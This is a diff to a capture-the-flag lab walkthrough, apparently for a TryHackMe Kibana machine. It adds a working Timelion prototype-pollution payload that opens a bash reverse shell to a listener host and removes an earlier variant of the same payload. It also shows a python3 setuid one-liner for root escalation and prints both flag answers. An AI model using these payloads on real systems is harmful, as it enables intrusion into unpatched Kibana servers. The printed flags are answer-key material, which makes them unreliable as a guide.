@@ -41,16 +41,38 @@ Give `<ip>:port` to access kibana. (`10.10.174.118:5601`)
 
 ### Compromise the machine and locate user.txt
 
-https://github.com/mpgn/CVE-2019-7609
+        THM{1s_easy_pwn3d_k1bana_w1th_rce}
+        
+Copy this payload
 
-![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/15fea3fa-b706-4ace-8c9b-1975f37a0eb4)
+    .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i >& /dev/tcp/10.9.19.3/4444                      0>&1\'");//').props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
 
-* This is the link of github repository which consists of the payload to exploit this vulnerability.
-* Copy the payload
-
-      .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
-      .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
-    
 * Open `Timelion` in kibana and paste the payload in the provided box.
 * Start a netcat listener
 
+![03](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/f29fb475-b117-49b8-8935-655069cd21b0)
+
+* Go to Canvas tab, we will get the response from reverse shell and we'll redirected to kiba directories.
+
+![05](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/5a186195-a9a6-49bd-9959-75d39d9a0a3d)
+
+### How would you recursively list all of these capabilities?
+
+* By using command `getcap -r/`
+
+![07](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/f19f99be-1e64-4d4b-9e46-f083a7edd1ee)
+
+
+![08](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/369f7e22-497f-463e-b95d-03b3b87e09e3)
+
+### Escalate privileges and obtain root.txt
+
+* Traverse to ./hackmeplease/ directory
+        
+* Give command  `./python3 -c ‘import os; os.setuid(0); os.system(“/bin/sh”)’`
+
+        THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}
+    
+![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/d5f6f110-18c1-4147-872e-9cb106ea4c62)
+
+![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/794d592b-9799-405f-b3dd-600ba5827818)
